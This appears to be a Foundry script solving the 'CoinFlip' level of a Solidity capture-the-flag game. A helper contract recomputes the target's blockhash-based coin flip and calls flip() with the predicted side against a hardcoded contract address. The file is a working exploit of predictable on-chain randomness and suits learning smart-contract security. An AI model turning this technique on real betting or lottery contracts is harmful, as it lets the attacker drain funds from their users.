// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Level3CoinFlip} from "../src/Level3CoinFlip.sol";
import {Script, console} from "forge-std/Script.sol";

contract GuessFlip {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(Level3CoinFlip _level3CoinFlip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _level3CoinFlip.flip(side);
    }
}

contract Level3CoinFlipSolv is Script {
    function run() external {
        Level3CoinFlip level3CoinFlip = Level3CoinFlip((0x5339dd5412A3517a67a34532276F177C349a8F0A));

        vm.startBroadcast();

        new GuessFlip(level3CoinFlip);
        console.log("consecutiveWins: ", level3CoinFlip.consecutiveWins());
        vm.stopBroadcast();
    }
}
